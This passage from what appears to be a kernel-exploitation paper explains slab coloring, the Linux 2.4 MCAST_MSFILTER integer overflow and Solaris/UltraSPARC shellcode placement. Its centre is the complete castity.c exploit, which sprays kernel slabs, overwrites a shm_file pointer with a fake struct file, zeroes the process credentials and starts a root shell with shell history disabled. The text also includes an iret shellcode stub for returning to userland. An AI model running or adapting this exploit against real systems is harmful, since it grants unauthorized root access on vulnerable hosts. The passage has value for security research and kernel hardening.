::quit\nAs you can see, from kstat we know that 2 slabs have been created and we\nknow the alignment, which is 8. Object size is 56 bytes and the size of\nthe in-slab control struct is 56, too. Each slab is 8192, which, modulo 56\ngives out exactly 16, which is the maxcolor value (the color range is thus\n0 - 16, which leads to three possible coloring with an alignment of 8).\nBased on the previous snippet of code, we know that first allocation had\na coloring of 8 ( mincolor == 0 + align == 8 ), the second one of 16\n(which is the value still recorded inside the kmem_cache_t).\nIf we were for exhausting this slab and get a new one we would know for\nsure that the coloring would be 0.\nLinux uses a similar 'circolar' coloring too, just look forward for\n'kmem_cache_t'->colour_next setting and incrementation.\nBoth the operating systems don't decrement the color value upon freeing of\na slab, so that has to be taken in account too (easy to do on Solaris,\nsince slab_create is the maximum number of slabs created).\n---[ 2.2.2 - Slab overflow exploiting : MCAST_MSFILTER\nGiven the technical basis to understand and exploit a slab overflow, it's\ntime for a practical example.\nWe're presenting here an exploit for the MCAST_MSFILTER [4] vulnerability\nfound by iSEC people :\n< linux-2.4.24\/net\/ipv4\/ip_sockglue.c >\ncase MCAST_MSFILTER:\n{\nstruct sockaddr_in *psin;\nstruct ip_msfilter *msf = 0;\nstruct group_filter *gsf = 0;\nint msize, i, ifindex;\nif (optlen < GROUP_FILTER_SIZE(0))\ngoto e_inval;\ngsf = (struct group_filter *)kmalloc(optlen,GFP_KERNEL); [2]\nif (gsf == 0) {\nerr = -ENOBUFS;\nbreak;\n}\nerr = -EFAULT;\nif (copy_from_user(gsf, optval, optlen)) {  [3]\ngoto mc_msf_out;\n}\nif (GROUP_FILTER_SIZE(gsf->gf_numsrc) < optlen) { [4]\nerr = EINVAL;\ngoto mc_msf_out;\n}\nmsize = IP_MSFILTER_SIZE(gsf->gf_numsrc);  [1]\nmsf = (struct ip_msfilter *)kmalloc(msize,GFP_KERNEL); [7]\nif (msf == 0) {\nerr = -ENOBUFS;\ngoto mc_msf_out;\n}\n[...]\nmsf->imsf_multiaddr = psin->sin_addr.s_addr;\nmsf->imsf_interface = 0;\nmsf->imsf_fmode = gsf->gf_fmode;\nmsf->imsf_numsrc = gsf->gf_numsrc;\nerr = -EADDRNOTAVAIL;\nfor (i=0; i<gsf->gf_numsrc; ++i) {  [5]\npsin = (struct sockaddr_in *)&gsf->gf_slist[i];\nif (psin->sin_family != AF_INET) [8]\ngoto mc_msf_out;\nmsf->imsf_slist[i] = psin->sin_addr.s_addr; [6]\n[...]\nmc_msf_out:\nif (msf)\nkfree(msf);\nif (gsf)\nkfree(gsf);\nbreak;\n[...]\n< \/ >\n< linux-2.4.24\/include\/linux\/in.h >\n#define IP_MSFILTER_SIZE(numsrc) \\    [1]\n(sizeof(struct ip_msfilter) - sizeof(__u32) \\\n+ (numsrc) * sizeof(__u32))\n[...]\n#define GROUP_FILTER_SIZE(numsrc) \\   [4]\n(sizeof(struct group_filter) - sizeof(struct\n__kernel_sockaddr_storage) \\\n+ (numsrc) * sizeof(struct __kernel_sockaddr_storage))\n< \/ >\nThe vulnerability consist of an integer overflow at [1], since we control\nthe gsf struct as you can see from [2] and [3].\nThe check at [4] proved to be, initially, a problem, which was resolved\nthanks to the slab property of not cleaning objects on free (back on that\nin a short).\nThe for loop at [5] is where we effectively do the overflow, by writing,\nat [6], the 'psin->sin_addr.s_addr' passed inside the gsf struct over the\npreviously allocated msf [7] struct (kmalloc'ed with bad calculated\n'msize' value).\nThis for loop is a godsend, because thanks to the check at [8] we are able\nto avoid the classical problem with integer overflow derived bugs (that is\nwriting _a lot_ after the buffer due to the usually huge value used to\ntrigger the overflow) and exit cleanly through mc_msf_out.\nAs explained before, while describing the 'first explotation approach', we\nneed to find some object\/data that gets kmalloc'ed in the same slab and\nwhich has inside a pointer or some crucial-value that would let us change\nthe execution flow.\nWe found a solution with the 'struct shmid_kernel' :\n< linux-2.4.24\/ipc\/shm.c >\nstruct shmid_kernel \/* private to the kernel *\/\n{\nstruct kern_ipc_perm    shm_perm;\nstruct file *           shm_file;\nint                     id;\n[...]\n};\n[...]\nasmlinkage long sys_shmget (key_t key, size_t size, int shmflg)\n{\nstruct shmid_kernel *shp;\nint err, id = 0;\ndown(&shm_ids.sem);\nif (key == IPC_PRIVATE) {\nerr = newseg(key, shmflg, size);\n[...]\nstatic int newseg (key_t key, int shmflg, size_t size)\n{\n[...]\nshp = (struct shmid_kernel *) kmalloc (sizeof (*shp), GFP_USER);\n[...]\n}\nAs you see, struct shmid_kernel is 64 bytes long and gets allocated using\nkmalloc (size-64) generic cache [ we can alloc as many as we want (up to\nfill the slab) using subsequent 'shmget' calls ].\nInside it there is a struct file pointer, that we could make point, thanks\nto the overflow, to the userland, where we will emulate all the necessary\nstructs to reach a function pointer dereference (that's exactly what the\nexploit does).\nNow it is time to force the msize value into being > 32 and =< 64, to make\nit being alloc'ed inside the same (size-64) generic cache.\n'Good' values for gsf->gf_numsrc range from 0x40000005 to 0x4000000c.\nThat raises another problem : since we're able to write 4 bytes for\nevery __kernel_sockaddr_storage present in the gsf struct we need a pretty\nlarge one to reach the 'shm_file' pointer, and so we need to pass a large\n'optlen' value.\nThe 0x40000005 - 0x4000000c range, thou, makes the GROUP_FILTER_SIZE() macro\nused at [4] evaluate to a positive and small value, which isn't large\nenough to reach the 'shm_file' pointer.\nWe solved that problem thanks to the fact that, once an object is free'd,\nits 'memory contents' are not zero'ed (or cleaned in any way).\nSince the copy_from_user at [3] happens _before_ the check at [4], we were\nable to create a sequence of 1024-sized objects by repeatedly issuing a\nfailing (at [4]) 'setsockopt', thus obtaining a large-enough one.\nHoping to make it clearer let's sum up the steps :\n- fill the 1024 slabs so that at next allocation a fresh one is returned\n- alloc the first object of the new 1024-slab.\n- use as many 'failing' setsockopt as needed to copy values inside\nobjects 2 and 3 [and 4, if needed, not the usual case thou]\n- free the first object\n- use a smaller (but still 1024-slab allocation driving) value for\noptlen that would pass the check at [4]\nAt that point the gsf pointer points to the first object inside our\nfreshly created slab. Objects 2 and 3 haven't been re-used yet, so still\ncontains our data. Since the objects inside the slab are adiacent we have\na de-facto larger (and large enough) gsf struct to reach the 'shm_file'\npointer.\nLast note, to reliably fill the slabs we check \/proc\/slabinfo.\nThe exploit, called castity.c, was written when the advisory went out, and\nis only for 2.4.* kernels (the sys_epoll vulnerability [12] was more than\nenough for 2.6.* ones ;) )\nExploit follows, just without the initial header, since the approach has\nbeen already extensively explained above.\n< stuff\/expl\/linux\/castity.c >\n#include <sys\/types.h>\n#include <sys\/stat.h>\n#include <sys\/shm.h>\n#include <sys\/socket.h>\n#include <sys\/resource.h>\n#include <sys\/wait.h>\n#include <stdio.h>\n#include <stdlib.h>\n#include <fcntl.h>\n#include <signal.h>\n#include <errno.h>\n#define __u32           unsigned int\n#define MCAST_MSFILTER  48\n#define SOL_IP          0\n#define SIZE            4096\n#define R_FILE          \"\/etc\/passwd\"    \/\/ Set it to whatever file you\ncan read. It's just for 1024 filling.\nstruct in_addr {\nunsigned int   s_addr;\n};\n#define __SOCK_SIZE__   16\nstruct sockaddr_in {\nunsigned short        sin_family;     \/* Address family               *\/\nunsigned short int    sin_port;       \/* Port number                  *\/\nstruct in_addr        sin_addr;       \/* Internet address             *\/\n\/* Pad to size of `struct sockaddr'. *\/\nunsigned char         __pad[__SOCK_SIZE__ - sizeof(short int) -\nsizeof(unsigned short int) - sizeof(struct\nin_addr)];\n};\nstruct group_filter\n{\n__u32                   gf_interface;   \/* interface index *\/\nstruct sockaddr_storage gf_group;       \/* multicast address *\/\n__u32                   gf_fmode;       \/* filter mode *\/\n__u32                   gf_numsrc;      \/* number of sources *\/\nstruct sockaddr_storage gf_slist[1];    \/* interface index *\/\n};\nstruct  damn_inode      {\nvoid            *a, *b;\nvoid            *c, *d;\nvoid            *e, *f;\nvoid            *i, *l;\nunsigned long   size[40];  \/\/ Yes, somewhere here :-)\n} le;\nstruct  dentry_suck     {\nunsigned int    count, flags;\nvoid            *inode;\nvoid            *dd;\n} fucking = { 0xbad, 0xbad, &le, NULL };\nstruct  fops_rox        {\nvoid            *a, *b, *c, *d, *e, *f, *g;\nvoid            *mmap;\nvoid            *h, *i, *l, *m, *n, *o, *p, *q, *r;\nvoid            *get_unmapped_area;\n} chien;\nstruct  file_fuck       {\nvoid            *prev, *next;\nvoid            *dentry;\nvoid            *mnt;\nvoid            *fop;\n} gagne = { NULL, NULL, &fucking, NULL, &chien };\nstatic char     stack[16384];\nint             gotsig = 0,\nfillup_1024 = 0,\nfillup_64 = 0,\nuid, gid;\nint             *pid, *shmid;\nstatic void sigusr(int b)\n{\ngotsig = 1;\n}\nvoid fatal (char *str)\n{\nfprintf(stderr, \"[-] %s\\n\", str);\nexit(EXIT_FAILURE);\n}\n#define BUFSIZE 256\nint calculate_slaboff(char *name)\n{\nFILE *fp;\nchar slab[BUFSIZE], line[BUFSIZE];\nint ret;\n\/* UP case *\/\nint active_obj, total;\nbzero(slab, BUFSIZE);\nbzero(line, BUFSIZE);\nfp = fopen(\"\/proc\/slabinfo\", \"r\");\nif ( fp == NULL )\nfatal(\"error opening \/proc for slabinfo\");\nfgets(slab, sizeof(slab) - 1, fp);\ndo {\nret = 0;\nif (!fgets(line, sizeof(line) - 1, fp))\nbreak;\nret = sscanf(line, \"%s %u %u\", slab, &active_obj, &total);\n} while (strcmp(slab, name));\nclose(fileno(fp));\nfclose(fp);\nreturn ret == 3 ? total - active_obj : -1;\n}\nint populate_1024_slab()\n{\nint fd[252];\nint i;\nsignal(SIGUSR1, sigusr);\nfor ( i = 0; i < 252 ; i++)\nfd[i] = open(R_FILE, O_RDONLY);\nwhile (!gotsig)\npause();\ngotsig = 0;\nfor ( i = 0; i < 252; i++)\nclose(fd[i]);\n}\nint kernel_code()\n{\nint i, c;\nint *v;\n__asm__(\"movl   %%esp, %0\" : : \"m\" (c));\nc &= 0xffffe000;\nv = (void *) c;\nfor (i = 0; i < 4096 \/ sizeof(*v) - 1; i++) {\nif (v[i] == uid && v[i+1] == uid) {\ni++; v[i++] = 0; v[i++] = 0; v[i++] = 0;\n}\nif (v[i] == gid) {\nv[i++] = 0; v[i++] = 0; v[i++] = 0; v[i++] = 0;\nreturn -1;\n}\n}\nreturn -1;\n}\nvoid    prepare_evil_file ()\n{\nint i = 0;\nchien.mmap = &kernel_code ;   \/\/ just to pass do_mmap_pgoff check\nchien.get_unmapped_area = &kernel_code;\n\/*\n* First time i run the exploit i was using a precise offset for\n* size, and i calculated it _wrong_. Since then my lazyness took\n* over and i use that \"\"very clean\"\" *g* approach.\n* Why i'm telling you ? It's 3 a.m., i don't find any better than\n* writing blubbish comments\n*\/\nfor ( i = 0; i < 40; i++)\nle.size[i] = SIZE;\n}\n#define SEQ_MULTIPLIER  32768\nvoid    prepare_evil_gf ( struct group_filter *gf, int id )\n{\nint                     filling_space = 64 - 4 * sizeof(int);\nint                     i = 0;\nstruct sockaddr_in      *sin;\nfilling_space \/= 4;\nfor ( i = 0; i < filling_space; i++ )\n{\nsin = (struct sockaddr_in *)&gf->gf_slist[i];\nsin->sin_family = AF_INET;\nsin->sin_addr.s_addr = 0x41414141;\n}\n\/* Emulation of struct kern_ipc_perm *\/\nsin = (struct sockaddr_in *)&gf->gf_slist[i++];\nsin->sin_family = AF_INET;\nsin->sin_addr.s_addr = IPC_PRIVATE;\nsin = (struct sockaddr_in *)&gf->gf_slist[i++];\nsin->sin_family = AF_INET;\nsin->sin_addr.s_addr = uid;\nsin = (struct sockaddr_in *)&gf->gf_slist[i++];\nsin->sin_family = AF_INET;\nsin->sin_addr.s_addr = gid;\nsin = (struct sockaddr_in *)&gf->gf_slist[i++];\nsin->sin_family = AF_INET;\nsin->sin_addr.s_addr = uid;\nsin = (struct sockaddr_in *)&gf->gf_slist[i++];\nsin->sin_family = AF_INET;\nsin->sin_addr.s_addr = gid;\nsin = (struct sockaddr_in *)&gf->gf_slist[i++];\nsin->sin_family = AF_INET;\nsin->sin_addr.s_addr = -1;\nsin = (struct sockaddr_in *)&gf->gf_slist[i++];\nsin->sin_family = AF_INET;\nsin->sin_addr.s_addr = id\/SEQ_MULTIPLIER;\n\/* evil struct file address *\/\nsin = (struct sockaddr_in *)&gf->gf_slist[i++];\nsin->sin_family = AF_INET;\nsin->sin_addr.s_addr = (unsigned long)&gagne;\n\/* that will stop mcast loop *\/\nsin = (struct sockaddr_in *)&gf->gf_slist[i++];\nsin->sin_family = 0xbad;\nsin->sin_addr.s_addr = 0xdeadbeef;\nreturn;\n}\nvoid    cleanup ()\n{\nint                     i = 0;\nstruct shmid_ds         s;\nfor ( i = 0; i < fillup_1024; i++ )\n{\nkill(pid[i], SIGUSR1);\nwaitpid(pid[i], NULL, __WCLONE);\n}\nfor ( i = 0; i < fillup_64 - 2; i++ )\nshmctl(shmid[i], IPC_RMID, &s);\n}\n#define EVIL_GAP        4\n#define SLAB_1024       \"size-1024\"\n#define SLAB_64         \"size-64\"\n#define OVF             21\n#define CHUNKS          1024\n#define LOOP_VAL        0x4000000f\n#define CHIEN_VAL       0x4000000b\nmain()\n{\nint                     sockfd, ret, i;\nunsigned int            true_alloc_size, last_alloc_chunk, loops;\nchar                    *buffer;\nstruct group_filter     *gf;\nstruct shmid_ds         s;\nchar    *argv[] = { \"le-chien\", NULL };\nchar    *envp[] = { \"TERM=linux\", \"PS1=le-chien\\\\$\",\n\"BASH_HISTORY=\/dev\/null\", \"HISTORY=\/dev\/null\", \"history=\/dev\/null\",\n\"PATH=\/bin:\/sbin:\/usr\/bin:\/usr\/sbin:\/usr\/local\/bin:\/usr\/local\/sbin\",\n\"HISTFILE=\/dev\/null\", NULL };\ntrue_alloc_size = sizeof(struct group_filter) - sizeof(struct\nsockaddr_storage) + sizeof(struct sockaddr_storage) * OVF;\nsockfd = socket(AF_INET, SOCK_STREAM, 0);\nuid = getuid();\ngid = getgid();\ngf = malloc (true_alloc_size);\nif ( gf == NULL )\nfatal(\"Malloc failure\\n\");\ngf->gf_interface = 0;\ngf->gf_group.ss_family = AF_INET;\nfillup_64 = calculate_slaboff(SLAB_64);\nif ( fillup_64 == -1 )\nfatal(\"Error calculating slab fillup\\n\");\nprintf(\"[+] Slab %s fillup is %d\\n\", SLAB_64, fillup_64);\n\/* Yes, two would be enough, but we have that \"sexy\" #define, why\ndon't use it ? :-) *\/\nfillup_64 += EVIL_GAP;\nshmid = malloc(fillup_64 * sizeof(int));\nif ( shmid == NULL )\nfatal(\"Malloc failure\\n\");\n\/* Filling up the size-64 and obtaining a new page with EVIL_GAP\nentries *\/\nfor ( i = 0; i < fillup_64; i++ )\nshmid[i] = shmget(IPC_PRIVATE, 4096, IPC_CREAT|SHM_R);\nprepare_evil_file();\nprepare_evil_gf(gf, shmid[fillup_64 - 1]);\nbuffer = (char *)gf;\nfillup_1024 = calculate_slaboff(SLAB_1024);\nif ( fillup_1024 == -1 )\nfatal(\"Error calculating slab fillup\\n\");\nprintf(\"[+] Slab %s fillup is %d\\n\", SLAB_1024, fillup_1024);\nfillup_1024 += EVIL_GAP;\npid = malloc(fillup_1024 * sizeof(int));\nif (pid  == NULL )\nfatal(\"Malloc failure\\n\");\nfor ( i = 0; i < fillup_1024; i++)\npid[i] = clone(populate_1024_slab, stack + sizeof(stack) -\n4, 0, NULL);\nprintf(\"[+] Attempting to trash size-1024 slab\\n\");\n\/* Here starts the loop trashing size-1024 slab *\/\nlast_alloc_chunk = true_alloc_size % CHUNKS;\nloops = true_alloc_size \/ CHUNKS;\ngf->gf_numsrc = LOOP_VAL;\nprintf(\"[+] Last size-1024 chunk is of size %d\\n\",\nlast_alloc_chunk);\nprintf(\"[+] Looping for %d chunks\\n\", loops);\nkill(pid[--fillup_1024], SIGUSR1);\nwaitpid(pid[fillup_1024], NULL, __WCLONE);\nif ( last_alloc_chunk > 512  )\nret = setsockopt(sockfd, SOL_IP, MCAST_MSFILTER, buffer +\nloops * CHUNKS, last_alloc_chunk);\nelse\n\/*\n* Should never happen. If it happens it probably means that we've\n* bigger datatypes (or slab-size), so probably\n* there's something more to \"fix me\". The while loop below is\n* already okay for the eventual fixing ;)\n*\/\nfatal(\"Last alloc chunk fix me\\n\");\nwhile ( loops > 1 )\n{\nkill(pid[--fillup_1024], SIGUSR1);\nwaitpid(pid[fillup_1024], NULL, __WCLONE);\nret = setsockopt(sockfd, SOL_IP, MCAST_MSFILTER, buffer +\n--loops * CHUNKS, CHUNKS);\n}\n\/* Let's the real fun begin *\/\ngf->gf_numsrc = CHIEN_VAL;\nkill(pid[--fillup_1024], SIGUSR1);\nwaitpid(pid[fillup_1024], NULL, __WCLONE);\nshmctl(shmid[fillup_64 - 2], IPC_RMID, &s);\nsetsockopt(sockfd, SOL_IP, MCAST_MSFILTER, buffer, CHUNKS);\ncleanup();\nret = (unsigned long)shmat(shmid[fillup_64 - 1], NULL,\nSHM_RDONLY);\nif ( ret == -1)\n{\nprintf(\"Le Fucking Chien GAGNE!!!!!!!\\n\");\nsetresuid(0, 0, 0);\nsetresgid(0, 0, 0);\nexecve(\"\/bin\/sh\", argv, envp);\nexit(0);\n}\nprintf(\"Here we are, something sucked :\/ (if not L1_cache too big,\nprobably slab align, retry)\\n\" );\n}\n< \/ >\n------[ 2.3 - Stack overflow vulnerabilities\nWhen a process is in 'kernel mode' it has a stack which is different from\nthe stack it uses at userland. We'll call it 'kernel stack'.\nThat kernel stack is usually limited in size to a couple of pages (on\nLinux, for example, it is 2 pages, 8kb, but an option at compile time\nexist to have it limited at one page) and is not a surprise that a common\ndesign practice in kernel code developing is to use locally to a function\nas little stack space as possible.\nAt a first glance, we can imagine two different scenarios that could go\nunder the name of 'stack overflow vulnerabilities' :\n- 'standard' stack overflow vulnerability : a write past a buffer on the\nstack overwrites the saved instruction pointer or the frame pointer\n(Solaris only, Linux is compiled with -fomit-frame-pointer) or some\nvariable (usually a pointer) also located in the stack.\n- 'stack size overflow' : a deeply nested callgraph goes further the\nalloc'ed stack space.\nStack based explotation is more architectural and o.s. specific than the\nalready presented slab based one.\nThat is due to the fact that once the stack is trashed we achieve\nexecution flow hijack, but then we must find a way to somehow return to\nuserland. We con't cover here the details of x86 architecture, since those\nhave been already very well explained by noir in his phrack60 paper [13].\nWe will instead focus on the UltraSPARC architecture and on its more\ncommon operating system, Solaris. The next subsection will describe the\nrelevant details of it and will present a technique which is suitable\naswell for the exploiting of slab based overflow (or, more generally,\nwhatever 'controlled flow redirection' vulnerability).\nThe AMD64 architecture won't be covered yet, since it will be our 'example\narchitecture' for the next kind of vulnerabilities (race condition). The\nsendmsg [5] exploit proposed later on is, at the end, a stack based one.\nJust before going on with the UltraSPARC section we'll just spend a couple\nof words describing the return-to-ring3 needs on an x86 architecture and\nthe Linux use of the kernel stack (since it quite differs from the Solaris\none).\nLinux packs together the stack and the struct associated to every process\nin the system (on Linux 2.4 it was directly the task_struct, on Linux 2.6\nit is the thread_info one, which is way smaller and keeps inside a pointer\nto the task_struct). This memory area is, by default, 8 Kb (a kernel\noption exist to have it limited to 4 Kb), that is the size of two pages,\nwhich are allocated consecutively and with the first one aligned to a 2^13\nmultiple. The address of the thread_struct (or of the task_struct) is thus\ncalculable at runtime by masking out the 13 least significant bits of the\nKernel Stack (%esp).\nThe stack starts at the bottom of this page and 'grows' towards the top,\nwhere the thread_info (or the task_struct) is located. To prevent the\n'second' type of overflow when the 4 Kb Kernel Stack is selected at\ncompile time, the kernel uses two adjunctive per-CPU stacks, one for\ninterrupt handling and one for softirq and tasklets functions, both one\npage sized.\nIt is obviously on the stack that Linux stores all the information to\nreturn from exceptions, interrupts or function calls and, logically, to\nget back to ring3, for example by means of the iret instruction.\nIf we want to use the 'iret' instruction inside our shellcodes to get out\ncleanly from kernel land we have to prepare a fake stack frame as it\nexpects to find.\nWe have to supply:\n- a valid user space stack pointer\n- a valid user space instruction pointer\n- a valid EFLAGS saved EFLAGS register\n- a valid User Code Segment\n- a valid User Stack Segment\nLOWER ADDRESS\n+-----------------+\n|                 |\n|   User SS       | -+\n|   User ESP      |  |\n|   EFLAGS        |  |  Fake Iret Frame\n|   User CS       |  |\n|   User EIP      | -+  <----- current kernel stack pointer (ESP)\n|                 |\n+-----------------+\nWe've added a demonstrative stack based exploit (for the Linux dummy\ndriver) which implements a shellcode doing that recovery-approach :\nmovl   $0x7b,0x10(%esp)       \/\/ user stack segment (SS)\nmovl   $stack_chunk,0xc(%esp) \/\/ user stack pointer (ESP)\nmovl   $0x246,0x8(%esp)       \/\/ valid EFLAGS saved register\nmovl   $0x73,0x4(%esp)        \/\/ user code segment (CS)\nmovl   $code_chunk,0x0(%esp)  \/\/ user code pointer  (EIP)\niret\nYou can find it in < expl\/linux\/stack_based.c >\n---[ 2.3.1 - UltraSPARC exploiting\nThe UltraSPARC [14] is a full implementation of the SPARC V9 64-bit [2]\narchitecture. The most 'interesting' part of it from an exploiting\nperspective is the support it gives to the operating system for a fully\nseparated address space among userspace and kernelspace.\nThis is achieved through the use of context registers and address space\nidentifiers 'ASI'. The UltraSPARC MMU provides two settable context\nregisters, the primary (PContext) and the secondary (SContext) one. One\nmore context register hardwired to zero is provided, which is the nucleus\ncontext ('context' 0 is where the kernel lives).\nTo every process address space is associated a 'context value', which is\nset inside the PContext register during process execution. This value is\nused to perform memory addresses translation.\nEvery time a process issues a trap instruction to access kernel land (for\nexample ta 0x8 or ta 0x40, which is how system call are implemented on\nSolaris 10), the nucleus context is set as default. The process context\nvalue (as recorded inside PContext) is then moved to SContext, while the\nnucleus context becomes the 'primary context'.\nAt that point the kernel code can access directly the userland by\nspecifying the correct ASI to a load or store alternate instruction\n(instructions that support a direct asi immediate specified - lda\/sta).\nAddress Space Identifiers (ASIs) basically specify how those instruction\nhave to behave :\n< usr\/src\/uts\/sparc\/v9\/sys\/asi.h >\n#define ASI_N                   0x04    \/* nucleus *\/\n#define ASI_NL                  0x0C    \/* nucleus little *\/\n#define ASI_AIUP                0x10    \/* as if user primary *\/\n#define ASI_AIUS                0x11    \/* as if user secondary *\/\n#define ASI_AIUPL               0x18    \/* as if user primary little *\/\n#define ASI_AIUSL               0x19    \/* as if user secondary little *\/\n[...]\n#define ASI_USER        ASI_AIUS\n< \/ >\nTheese are ASI that are specified by the SPARC v9 reference (more ASI are\nmachine dependant and let modify, for example, MMU or other hardware\nregisters, check usr\/src\/uts\/sun4u\/sys\/machasi.h), the 'little' version is\njust used to specify a byte ordering access different from the 'standard'\nbig endian one (SPARC v9 can access data in both formats).\nThe ASI_USER is the one used to access, from kernel land, the user space.\nAn instruction like :\nldxa [addr]ASI_USER, %l1\nwould just load the double word stored at 'addr', relative to the address\nspace contex stored in the SContext register, 'as if' it was accessed by\nuserland code (so with all protection checks).\nIt is thus possible, if able to start executing a minimal stub of code, to\ncopy bytes from the userland wherever we want at kernel land.\nBut how do we execute code at first ? Or, to make it even more clearer,\nwhere do we return once we have performed our (slab\/stack) overflow and\nhijacked the instruction pointer ?\nTo complicate things a little more, the UltraSPARC architecture implements\nthe execution bit permission over TTEs (Translation Table Entry, which are\nthe TLB entries used to perform virtual\/physical translations).\nIt is time to give a look at Solaris Kernel implementation to find a\nsolution. The technique we're going to present now (as you'll quickly\nfigure out) is not limited to stack based exploiting, but can be used\nevery time you're able to redirect to an arbitrary address the instruction\nflow at kernel land.\n---] 2.3.2 - A reliable Solaris\/UltraSPARC exploit\nThe Solaris process model is slightly different from the Linux one. The\nfoundamental unit of scheduling is the 'kernel thread' (described by the\nkthread_t structure), so one has to be associated to every existing LWP\n(light-weight process) in a process.\nLWPs are just kernel objects which represent the 'kernel state' of every\n'user thread' inside a process and thus let each one enter the kernel\nindipendently (without LWPs, user thread would contend at system call).\nThe information relative to a 'running process' are so scattered among\ndifferent structures. Let's see what we can make out of them.\nEvery Operating System (and Solaris doesn't differ) has a way to quickly\nget the 'current running process'. On Solaris it is the 'current kernel\nthread' and it's obtained, on UltraSPARC, by :\n#define curthread       (threadp())\n< usr\/src\/uts\/sparc\/ml\/sparc.il >\n! return current thread pointer\n.inline threadp,0\n.register %g7, #scratch\nmov     %g7, %o0\n.end\n< \/ >\nIt is thus stored inside the %g7 global register.\nFrom the kthread_t struct we can access all the other 'process related'\nstructs. Since our main purpose is to raise privileges we're interested in\nwhere the Solaris kernel stores process credentials.\nThose are saved inside the cred_t structure pointed to by the proc_t one :\n# mdb -k\nLoading modules: [ unix krtld genunix ip usba nfs random ptm ]\n> ::ps ! grep snmpdx\nR    278      1    278    278     0 0x00010008 0000030000e67488 snmpdx\n> 0000030000e67488::print proc_t\n{\np_exec = 0x30000e5b5a8\np_as = 0x300008bae48\np_lockp = 0x300006167c0\np_crlock = {\n_opaque = [ 0 ]\n}\np_cred = 0x3000026df28\n[...]\n> 0x3000026df28::print cred_t\n{\ncr_ref = 0x67b\ncr_uid = 0\ncr_gid = 0\ncr_ruid = 0\ncr_rgid = 0\ncr_suid = 0\ncr_sgid = 0\ncr_ngroups = 0\ncr_groups = [ 0 ]\n}\n> ::offsetof proc_t p_cred\noffsetof (proc_t, p_cred) = 0x20\n> ::quit\n#\nThe '::ps' dcmd ouput introduces a very interesting feature of the Solaris\nOperating System, which is a god-send for exploiting.\nThe address of the proc_t structure in kernel land is exported to\nuserland :\nbash-2.05$ ps -aef -o addr,comm | grep snmpdx\n30000e67488 \/usr\/lib\/snmp\/snmpdx\nbash-2.05$\nAt a first glance that could seem of not great help, since, as we said,\nthe kthread_t struct keeps a pointer to the related proc_t one :\n> ::offsetof kthread_t t_procp\noffsetof (kthread_t, t_procp) = 0x118\n> ::ps ! grep snmpdx\nR    278      1    278    278     0 0x00010008 0000030000e67488 snmpdx\n> 0000030000e67488::print proc_t p_tlist\np_tlist = 0x30000e52800\n> 0x30000e52800::print kthread_t t_procp\nt_procp = 0x30000e67488\n>\nTo understand more precisely why the exported address is so important we\nhave to take a deeper look at the proc_t structure.\nThis structure contains the user_t struct, which keeps information like\nthe program name, its argc\/argv value, etc :\n> 0000030000e67488::print proc_t p_user\n[...]\np_user.u_ticks = 0x95c\np_user.u_comm = [ \"snmpdx\" ]\np_user.u_psargs = [ \"\/usr\/lib\/snmp\/snmpdx -y -c \/etc\/snmp\/conf\" ]\np_user.u_argc = 0x4\np_user.u_argv = 0xffbffcfc\np_user.u_envp = 0xffbffd10\np_user.u_cdir = 0x3000063fd40\n[...]\nWe can control many of those.\nEven more important, the pages that contains the process_cache (and thus\nthe user_t struct), are not marked no-exec, so we can execute from there\n(for example the kernel stack, allocated from the seg_kp [kernel pageable\nmemory] segment, is not executable).\nLet's see how 'u_psargs' is declared :\n< usr\/src\/common\/sys\/user.h >\n#define PSARGSZ         80      \/* Space for exec arguments (used by\nps(1)) *\/\n#define MAXCOMLEN       16      \/* <= MAXNAMLEN, >= sizeof (ac_comm) *\/\n[...]\ntypedef struct  user {\n\/*\n* These fields are initialized at process creation time and never\n* modified.  They can be accessed without acquiring locks.\n*\/\nstruct execsw *u_execsw;        \/* pointer to exec switch entry *\/\nauxv_t  u_auxv[__KERN_NAUXV_IMPL]; \/* aux vector from exec *\/\ntimestruc_t u_start;            \/* hrestime at process start *\/\nclock_t u_ticks;                \/* lbolt at process start *\/\nchar    u_comm[MAXCOMLEN + 1];  \/* executable file name from exec\n*\/\nchar    u_psargs[PSARGSZ];      \/* arguments from exec *\/\nint     u_argc;                 \/* value of argc passed to main()\n*\/\nuintptr_t u_argv;               \/* value of argv passed to main()\n*\/\nuintptr_t u_envp;               \/* value of envp passed to main()\n*\/\n[...]\n< \/ >\nThe idea is simple : we put our shellcode on the command line of our\nexploit (without 'zeros') and we calculate from the exported proc_t\naddress the exact return address.\nThis is enough to exploit all those situations where we have control of\nthe execution flow _without_ trashing the stack (function pointer\noverwriting, slab overflow, etc).\nWe have to remember to take care of the alignment, thou, since the\nUltraSPARC fetch unit raises an exception if the address it reads the\ninstruction from is not aligned on a 4 bytes boundary (which is the size\nof every sparc instruction) :\n> ::offsetof proc_t p_user\noffsetof (proc_t, p_user) = 0x330\n> ::offsetof user_t u_psargs\noffsetof (user_t, u_psargs) = 0x161\n>\nSince the proc_t taken from the 'process cache' is always aligned to an 8\nbyte boundary, we have to jump 3 bytes after the starting of the u_psargs\nchar array (which is where we'll put our shellcode).\nThat means that we have space for 76 \/ 4 = 19 instructions, which is\nusually enough for average shellcodes.. but space is not really a limit\nsince we can 'chain' more psargs struct from different processes, simply\njumping from each others. Moreover we could write a two stage shellcode\nthat would just start copying over our larger one from the userland using\nthe load from alternate space instructions presented before.\nWe're now facing a slightly more complex scenario, thou, which is the\n'kernel stack overflow'. We assume here that you're somehow familiar with\nuserland stack based exploiting (if you're not you can check [15] and\n[16]).\nThe main problem here is that we have to find a way to safely return to\nuserland once trashed the stack (and so, to reach the instruction pointer,\nthe frame pointer). A good way to understand how the 'kernel stack' is\nused to return to userland is to follow the path of a system call.\nYou can get a quite good primer here [17], but we think that a read\nthrough opensolaris sources is way better (you'll see also, following the\nsys_trap entry in uts\/sun4u\/ml\/mach_locore.s, the code setting the nucleus\ncontext as the PContext register).\nLet's focus on the 'kernel stack' usage :\n< usr\/src\/uts\/sun4u\/ml\/mach_locore.s >\nALTENTRY(user_trap)\n!\n! user trap\n!\n! make all windows clean for kernel\n! buy a window using the current thread's stack\n!\nsethi   %hi(nwin_minus_one), %g5\nld      [%g5 + %lo(nwin_minus_one)], %g5\nwrpr    %g0, %g5, %cleanwin\nCPU_ADDR(%g5, %g6)\nldn     [%g5 + CPU_THREAD], %g5\nldn     [%g5 + T_STACK], %g6\nsub     %g6, STACK_BIAS, %g6\nsave    %g6, 0, %sp\n< \/ >\nIn %g5 is saved the number of windows that are 'implemented' in the\narchitecture minus one, which is, in that case, 8 - 1 = 7.\nCLEANWIN is set to that value since there are no windows in use out of the\ncurrent one, and so the kernel has 7 free windows to use.\nThe cpu_t struct addr is then 